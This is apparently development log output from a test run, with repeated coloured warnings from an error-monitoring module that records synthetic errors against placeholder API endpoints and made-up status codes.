WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862696Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3258'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862748Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3259'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862802Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3260'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862854Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3261'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862906Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3262'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862957Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3263'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863008Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3264'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863058Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3265'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863108Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3266'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863157Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3267'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863206Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3268'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863305Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3269'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863381Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3270'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863439Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3271'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863491Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3272'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863542Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3273'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863592Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3274'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863641Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3275'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863690Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3276'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863739Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3277'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863787Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3278'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863835Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3279'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863883Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3280'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863931Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3281'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.863980Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3282'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864028Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3283'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864076Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3284'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864123Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3285'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864221Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3286'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864289Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3287'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864348Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3288'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864399Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3289'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864449Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3290'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864498Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3291'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864547Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3292'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864596Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3293'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864645Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3294'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864693Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3295'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864741Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3296'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.864789Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3297'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
